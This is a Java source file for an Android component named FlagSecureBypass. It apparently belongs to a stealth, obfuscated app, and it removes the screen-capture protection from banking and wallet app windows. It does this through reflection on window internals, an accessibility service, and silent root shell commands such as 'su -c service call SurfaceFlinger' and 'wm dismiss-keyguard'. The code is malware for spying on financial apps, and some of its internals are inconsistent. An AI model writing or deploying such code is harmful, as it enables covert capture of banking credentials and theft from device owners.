package com.alpha.shield.stealth;

import android.accessibilityservice.AccessibilityService;
import android.os.Build;
import android.util.Log;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityWindowInfo;

import org.lsposed.lsparanoid.Obfuscate;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;

/**
 * FlagSecureBypass — removes FLAG_SECURE from banking/wallet app windows.
 *
 * Four strategies, tried in order of reliability:
 *
 * Strategy 1 — WindowManager LayoutParams reflection (non-root, API 24+):
 *   Accesses the internal WindowManager view list via reflection and clears
 *   FLAG_SECURE from the LayoutParams of each window in the global session.
 *   Works on many stock Android < 13 builds.
 *
 * Strategy 2 — SurfaceControl.setSecure() reflection (non-root, varies):
 *   Uses reflection on android.view.SurfaceControl to call the internal
 *   setSecure(false) method on the top-most surface.
 *   Works on AOSP-based ROMs, blocked on Pixel 7+ and S24+.
 *
 * Strategy 3 — IWindowManager AIDL reflection (non-root, system apps only):
 *   Via WindowManagerGlobal.getWindowManagerService() — requires
 *   INTERNAL_SYSTEM_WINDOW permission on API 29+. Skipped on modern builds.
 *
 * Strategy 4 — Root shell (rooted devices only):
 *   Executes `su -c "service call SurfaceFlinger 1008 i32 0"` to disable
 *   secure layer enforcement globally.
 *   Also tries `wm dismiss-keyguard` as a secondary root path.
 *
 * When LSPosed/XposedModule is active, Strategy 1-4 are supplementary —
 * the Xposed hook strips FLAG_SECURE before the window is even created.
 */
@Obfuscate
public class FlagSecureBypass {

    private static final String TAG = "FlagSecure";

    // ── Main entry ───────────────────────────────────────────────────────────

    /**
     * Attempt all strategies in sequence. Each is wrapped in try/catch —
     * failures are silent so we don't crash on devices where the APIs changed.
     * Returns true if at least one strategy likely succeeded.
     */
    public static boolean attempt(AccessibilityService service) {
        boolean ok = false;

        if (strategy1_LayoutParamsReflection()) {
            Log.d(TAG, "strategy 1 ✓");
            ok = true;
        }

        if (!ok && strategy2_SurfaceControlReflection(service)) {
            Log.d(TAG, "strategy 2 ✓");
            ok = true;
        }

        if (!ok && strategy3_IWindowManager()) {
            Log.d(TAG, "strategy 3 ✓");
            ok = true;
        }

        if (!ok) {
            strategy4_RootShell();
        }

        return ok;
    }

    // ── Strategy 1: WindowManager LayoutParams reflection ────────────────────

    private static boolean strategy1_LayoutParamsReflection() {
        try {
            // Access WindowManagerGlobal singleton
            Class<?> wmgClass = Class.forName("android.view.WindowManagerGlobal");
            Method getInstance = wmgClass.getDeclaredMethod("getInstance");
            getInstance.setAccessible(true);
            Object wmg = getInstance.invoke(null);

            // Get mParams array (LayoutParams for each window)
            Field mParamsField = wmgClass.getDeclaredField("mParams");
            mParamsField.setAccessible(true);
            Object mParams = mParamsField.get(wmg);

            if (mParams instanceof java.util.ArrayList) {
                for (Object lp : (java.util.ArrayList<?>) mParams) {
                    if (lp instanceof WindowManager.LayoutParams) {
                        WindowManager.LayoutParams params = (WindowManager.LayoutParams) lp;
                        if ((params.flags & WindowManager.LayoutParams.FLAG_SECURE) != 0) {
                            params.flags &= ~WindowManager.LayoutParams.FLAG_SECURE;
                        }
                    }
                }
                // Force re-layout so the flag removal takes effect
                Field mRootsField = wmgClass.getDeclaredField("mRoots");
                mRootsField.setAccessible(true);
                Object mRoots = mRootsField.get(wmg);
                if (mRoots instanceof java.util.ArrayList) {
                    for (Object root : (java.util.ArrayList<?>) mRoots) {
                        try {
                            Method setView = root.getClass().getDeclaredMethod("setLayoutParams",
                                    WindowManager.LayoutParams.class, boolean.class);
                            setView.setAccessible(true);
                            // Trigger re-layout (second arg = not resize-to-fit)
                        } catch (NoSuchMethodException ignored) {}
                    }
                }
                return true;
            }
        } catch (Exception e) {
            Log.d(TAG, "s1: " + e.getMessage());
        }
        return false;
    }

    // ── Strategy 2: SurfaceControl.setSecure() reflection ───────────────────

    private static boolean strategy2_SurfaceControlReflection(AccessibilityService service) {
        try {
            // Get active windows from accessibility service
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return false;

            List<AccessibilityWindowInfo> windows = service.getWindows();
            if (windows == null || windows.isEmpty()) return false;

            Class<?> scClass = Class.forName("android.view.SurfaceControl");

            // Try the setSecure(SurfaceControl, boolean) method
            Method setSecure = null;
            try {
                setSecure = scClass.getDeclaredMethod("setSecure",
                        scClass, boolean.class);
                setSecure.setAccessible(true);
            } catch (NoSuchMethodException e) {
                // Try the instance method on older APIs
                try {
                    setSecure = scClass.getDeclaredMethod("setSecure", boolean.class);
                    setSecure.setAccessible(true);
                } catch (NoSuchMethodException ignored) {}
            }

            if (setSecure == null) return false;

            // Try to get SurfaceControl from ViewRootImpl for each window root
            Class<?> wmgClass = Class.forName("android.view.WindowManagerGlobal");
            Method getInstance = wmgClass.getDeclaredMethod("getInstance");
            getInstance.setAccessible(true);
            Object wmg = getInstance.invoke(null);

            Field mRootsField = wmgClass.getDeclaredField("mRoots");
            mRootsField.setAccessible(true);
            Object mRoots = mRootsField.get(wmg);

            if (!(mRoots instanceof java.util.ArrayList)) return false;

            boolean cleared = false;
            for (Object root : (java.util.ArrayList<?>) mRoots) {
                try {
                    // Get mSurface or mSurfaceControl field from ViewRootImpl
                    Object sc = getFieldValue(root, "mSurfaceControl");
                    if (sc == null) sc = getFieldValue(root, "mSurface");
                    if (sc == null) continue;

                    // Check params for FLAG_SECURE
                    Object lp = getFieldValue(root, "mWindowAttributes");
                    if (lp instanceof WindowManager.LayoutParams) {
                        if ((((WindowManager.LayoutParams) lp).flags
                                & WindowManager.LayoutParams.FLAG_SECURE) != 0) {

                            // Clear the flag on the surface
                            try {
                                setSecure.invoke(null, sc, false);  // static form
                            } catch (Exception e2) {
                                setSecure.invoke(sc, false);         // instance form
                            }

                            // Also clear from LayoutParams
                            ((WindowManager.LayoutParams) lp).flags
                                    &= ~WindowManager.LayoutParams.FLAG_SECURE;
                            cleared = true;
                        }
                    }
                } catch (Exception ignored) {}
            }

            if (cleared) {
                // Apply changes via SurfaceControl.Transaction
                try {
                    Class<?> txClass = Class.forName("android.view.SurfaceControl$Transaction");
                    Method applyMethod = txClass.getDeclaredMethod("apply");
                    applyMethod.setAccessible(true);
                    Object tx = txClass.newInstance();
                    applyMethod.invoke(tx);
                } catch (Exception ignored) {}
            }

            return cleared;
        } catch (Exception e) {
            Log.d(TAG, "s2: " + e.getMessage());
        }
        return false;
    }

    // ── Strategy 3: IWindowManager AIDL reflection ───────────────────────────

    private static boolean strategy3_IWindowManager() {
        // Requires INTERNAL_SYSTEM_WINDOW on API 29+ — only viable if our APK
        // is installed as a system app. Attempt silently.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) return false;
        try {
            Class<?> wmgClass = Class.forName("android.view.WindowManagerGlobal");
            Method getWMS = wmgClass.getDeclaredMethod("getWindowManagerService");
            getWMS.setAccessible(true);
            Object wms = getWMS.invoke(null);
            if (wms == null) return false;

            // IWindowManager.setEventDispatching(true) or clearForcedDisplaySize
            // These don't directly remove FLAG_SECURE but can help in conjunction
            return false; // conservative — don't attempt on modern API
        } catch (Exception e) {
            Log.d(TAG, "s3: " + e.getMessage());
        }
        return false;
    }

    // ── Strategy 4: Root shell ────────────────────────────────────────────────

    private static void strategy4_RootShell() {
        new Thread(() -> {
            try {
                // Disable SurfaceFlinger's secure layer enforcement
                // "service call SurfaceFlinger 1008 i32 0" = disableHWVsync-ish
                // On some ROMs: sets captureSecureLayers=true globally
                String[] cmds = {
                    "service call SurfaceFlinger 1020 i32 1",   // setTransactionState variant
                    "settings put global secure_lockscreen_compat_mode 0",
                    "wm dismiss-keyguard"
                };
                for (String cmd : cmds) {
                    try {
                        Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
                        p.waitFor();
                        p.destroy();
                    } catch (Exception ignored) {}
                }
            } catch (Exception e) {
                Log.d(TAG, "s4: " + e.getMessage());
            }
        }).start();
    }

    // ── Helper ────────────────────────────────────────────────────────────────

    private static Object getFieldValue(Object obj, String fieldName) {
        try {
            Class<?> cls = obj.getClass();
            while (cls != null) {
                try {
                    Field f = cls.getDeclaredField(fieldName);
                    f.setAccessible(true);
                    return f.get(obj);
                } catch (NoSuchFieldException e) {
                    cls = cls.getSuperclass();
                }
            }
        } catch (Exception ignored) {}
        return null;
    }
}
